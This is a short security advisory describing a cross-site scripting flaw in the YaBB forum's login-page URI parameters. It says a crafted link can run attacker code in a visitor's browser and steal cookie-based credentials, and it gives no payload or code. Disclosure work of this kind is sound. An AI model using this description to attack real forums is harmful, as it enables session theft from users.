A cross-site scripting vulnerability has been reported in the YaBB forum. This vulnerability is due to insufficient sanitization of URI parameters in some scripts.

As a result, it is possible for a remote attacker to create a malicious link to the login page of a site hosting the web forum. When this link is visited by an unsuspecting web user, the attacker-supplied code will be executed in their browser in the security context of the vulnerable website.

It has been demonstrated that this vulnerability may be exploited to steal cookie-based authentication credentials.
